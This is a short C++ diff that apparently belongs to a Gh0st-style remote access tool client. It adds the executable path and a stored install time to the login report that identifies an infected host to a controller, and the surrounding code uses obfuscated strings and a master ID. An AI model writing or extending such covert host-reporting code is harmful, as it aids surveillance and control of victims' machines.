@@ -201,12 +201,26 @@ LOGIN_INFOR GetLoginInfo(DWORD dwSpeed, const CONNECT_ADDRESS& conn)
 	LoginInfor.bWebCamIsExist = bWebCamIsExist;
 	strcpy_s(LoginInfor.szStartTime, getProcessTime().c_str());
 	sprintf_s(LoginInfor.szReserved, "%s", GetClientType(conn.ClientType()));
+	LoginInfor.AddReserved("?");                        // 系统位数
+	LoginInfor.AddReserved("?");                        // CPU核数
+	LoginInfor.AddReserved("?");                        // 系统内存
+	char buf[_MAX_PATH] = {};
+	GetModuleFileNameA(NULL, buf, sizeof(buf));
+	LoginInfor.AddReserved(buf);                        // 文件路径
+	LoginInfor.AddReserved("?");						// test
+	std::string installTime;
+	auto b = ReadAppSettingA("install_time", installTime);
+	if (!b || installTime.empty()) {
+		installTime = ToPekingTimeAsString(nullptr);;
+		WriteAppSettingA("install_time", installTime);
+	}
+	LoginInfor.AddReserved(installTime.c_str());
 	bool isDefault = strlen(conn.szFlag) == 0 || strcmp(conn.szFlag, skCrypt(FLAG_GHOST)) == 0 ||
 		strcmp(conn.szFlag, skCrypt("Happy New Year!")) == 0;
 	std::string masterHash(skCrypt(MASTER_HASH));
 	const char* id = isDefault ? masterHash.c_str() : conn.szFlag;
 	memcpy(LoginInfor.szMasterID, id, min(strlen(id), 16));
-
+	
 	return LoginInfor;
 }
 
